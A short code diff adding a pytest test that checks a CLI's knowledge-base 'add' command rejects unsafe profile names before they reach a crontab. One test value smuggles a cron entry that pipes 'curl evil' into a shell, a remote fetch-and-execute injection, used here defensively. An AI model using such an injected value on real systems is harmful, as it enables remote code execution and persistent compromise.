@@ -123,3 +123,13 @@ def test_schedule_unknown_profile_errors(tmp_path, monkeypatch, fake_crontab):
     monkeypatch.setenv("MEMFORGE_ADAPTER_CONFIG", str(tmp_path / "adapter.toml"))
     result = CliRunner().invoke(cli, ["adapter", "kb", "schedule", "nope"])
     assert result.exit_code != 0
+
+
+@pytest.mark.parametrize("bad", ["my notes", "work\n0 0 * * * curl evil|sh", "a#b", "a]b", "a/b"])
+def test_kb_add_rejects_unsafe_profile_names(tmp_path, monkeypatch, bad):
+    """Unsafe names are rejected so they can never reach a crontab line."""
+    monkeypatch.setenv("MEMFORGE_ADAPTER_CONFIG", str(tmp_path / "adapter.toml"))
+    root = tmp_path / "vault"
+    root.mkdir()
+    result = CliRunner().invoke(cli, ["adapter", "kb", "add", bad, "--root", str(root)])
+    assert result.exit_code != 0
